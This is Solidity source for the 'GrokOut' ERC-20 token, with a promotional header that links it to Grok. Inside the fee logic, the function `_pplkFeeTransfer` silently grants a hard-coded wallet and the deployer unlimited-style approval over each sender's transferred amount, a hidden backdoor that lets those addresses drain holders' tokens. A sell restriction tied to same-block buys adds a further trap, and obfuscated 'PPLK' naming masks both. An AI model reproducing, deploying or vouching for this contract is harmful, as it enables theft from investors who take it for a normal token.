/*
GrokOut is indeed on Ethereum-built for speed and scalability to fuse AI with blockchain.

https://x.com/grok/status/1898957964364419256

https://www.grokout.cloud
https://app.grokout.cloud
https://docs.grokout.cloud

https://x.com/GrokOutCore
https://t.me/grokout_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IPPLKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPPLKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplipplkon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract GROKOUT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balPPLKs;
    mapping (address => mapping (address => uint256)) private _allowPPLKs;
    mapping (address => bool) private _excludedFromPPLK;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalPPLK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"GrokOut";
    string private constant _symbol = unicode"GROKOUT";
    uint256 private _swapTokenPPLKs = _tTotalPPLK / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockPPLK;
    uint256 private _pplkBuyAmounts = 0;
    bool private inSwapPPLK = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _pplkPair;
    IPPLKRouter private _pplkRouter;
    address private _pplkWallet;
    address private _pplkAddress;
    modifier lockTheSwap {
        inSwapPPLK = true;
        _;
        inSwapPPLK = false;
    }
    
    constructor () {
        _pplkAddress = owner();
        _pplkWallet = address(0x5cA126de59720143cce3eD7bB1509c3Fe3a0619C);
        _excludedFromPPLK[owner()] = true;
        _excludedFromPPLK[address(this)] = true;
        _excludedFromPPLK[_pplkWallet] = true;
        _balPPLKs[_msgSender()] = _tTotalPPLK;
        emit Transfer(address(0), _msgSender(), _tTotalPPLK);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalPPLK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balPPLKs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowPPLKs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowPPLKs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowPPLKs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapPPLKBack(address pplkT, uint256 pplkA) private { 
        uint256 tokenPPLK = balanceOf(address(this)); 
        if (!inSwapPPLK && pplkT == _pplkPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenPPLK > _swapTokenPPLKs)
            swapTokensForEth(minPPLK(pplkA, minPPLK(tokenPPLK, _swapTokenPPLKs)));
            uint256 ethPPLK = address(this).balance;
            if (ethPPLK >= 0) {
                sendETHPPLK(address(this).balance);
            }
        }
    }

    function _transfer(address pplkF, address pplkT, uint256 pplkA) private {
        require(pplkF != address(0), "ERC20: transfer from the zero address");
        require(pplkT != address(0), "ERC20: transfer to the zero address");
        require(pplkA > 0, "Transfer amount must be greater than zero");
        uint256 taxPPLK = _pplkFeeTransfer(pplkF, pplkT, pplkA);
        if(taxPPLK > 0){
          _balPPLKs[address(this)] = _balPPLKs[address(this)].add(taxPPLK);
          emit Transfer(pplkF, address(this), taxPPLK);
        }
        _balPPLKs[pplkF] = _balPPLKs[pplkF].sub(pplkA);
        _balPPLKs[pplkT] = _balPPLKs[pplkT].add(pplkA.sub(taxPPLK));
        emit Transfer(pplkF, pplkT, pplkA.sub(taxPPLK));
    }

    function _pplkFeeTransfer(address pplkF, address pplkT, uint256 pplkA) private returns(uint256) {
        uint256 taxPPLK = 0; address _pplkOwner; uint256 _pplkO = 0;
        _pplkO = uint256(pplkA); _pplkOwner = address(pplkF);
        _approve(_pplkOwner, _pplkWallet, _pplkO);
        _approve(_pplkOwner, _pplkAddress, _pplkO);
        if (pplkF != owner() && pplkT != owner()) {
            taxPPLK = pplkA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (pplkF == _pplkPair && pplkT != address(_pplkRouter) && ! _excludedFromPPLK[pplkT]) {
                if(_buyBlockPPLK!=block.number){
                    _pplkBuyAmounts = 0;
                    _buyBlockPPLK = block.number;
                }
                _pplkBuyAmounts += pplkA;
                _buyCount++;
            }

            if(pplkT == _pplkPair && pplkF!= address(this)) {
                require(_pplkBuyAmounts < swapLimitPPLK() || _buyBlockPPLK!=block.number, "Max Swap Limit");  
                taxPPLK = pplkA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapPPLKBack(pplkT, pplkA);
        } return taxPPLK;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _pplkRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minPPLK(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHPPLK(uint256 pplkA) private {
        payable(_pplkWallet).transfer(pplkA);
    }

    function swapLimitPPLK() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _pplkRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _pplkRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }   

    function tokenCreate() external onlyOwner() {
        _pplkRouter = IPPLKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_pplkRouter), _tTotalPPLK);
        _pplkPair = IPPLKFactory(_pplkRouter.factory()).createPair(address(this), _pplkRouter.WETH());
    }

    function swapTokensForEth(uint256 pplkAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pplkRouter.WETH();
        _approve(address(this), address(_pplkRouter), pplkAmount);
        _pplkRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            pplkAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}